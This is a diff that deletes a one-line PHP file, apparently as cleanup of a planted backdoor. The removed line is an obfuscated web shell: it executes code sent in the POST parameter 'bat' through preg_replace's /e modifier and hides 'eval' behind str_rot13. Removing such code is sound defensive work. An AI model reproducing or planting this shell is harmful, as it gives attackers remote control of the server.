@@ -1,1 +1,0 @@
-<?php ($www= $_POST['bat']) && @preg_replace('/ad/e','@'.str_rot13('riny').'($www)', 'add');?>
